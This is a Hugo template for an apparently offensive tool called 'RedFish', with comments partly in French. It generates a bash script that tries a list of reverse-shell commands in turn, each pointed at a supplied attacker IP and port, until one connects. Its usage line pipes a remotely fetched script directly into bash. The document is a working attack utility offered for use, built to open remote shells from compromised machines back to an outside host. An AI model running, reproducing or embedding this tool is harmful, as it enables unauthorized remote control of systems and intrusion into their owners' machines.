#!/bin/bash
# RedFish — reverse shell one-liner (raw)
# Chaque echec passe a la commande suivante (||) ; le premier shell qui
# fonctionne stoppe tout. Perl/PHP (code 0 meme en echec) are in last.
# Usage :
#   curl -sL axolol.fr/r | bash -s <ip>[:<port>]   (port par défaut : 4444)
A=${1:-127.0.0.1}
I=${A%%:*} P=${A##*:}
[ "$I" = "$P" ] && P=4444
{{- $cmds := slice }}
{{- $liars := slice }}
{{- range hugo.Data.shells }}
{{- $meta := .meta | default (slice "linux" "mac") }}
{{- if and (in $meta "linux") (not (isset . "raw")) }}
{{- $c := .command }}
{{- if in $c "'" }}
{{- $c = replace (replace $c "{port}" "'\"$P\"'") "{ip}" "'\"$I\"'" }}
{{- else }}
{{- $c = replace (replace $c "{port}" "\"$P\"") "{ip}" "\"$I\"" }}
{{- end }}
{{- if or (in $c "php -r") (in $c "use Socket") }}
{{- $liars = $liars | append $c }}
{{- else }}
{{- $cmds = $cmds | append $c }}
{{- end }}
{{- end }}
{{- end }}
({{ delimit $cmds ") || (" }}){{ with $liars }} || ({{ delimit . ") || (" }}){{ end }}
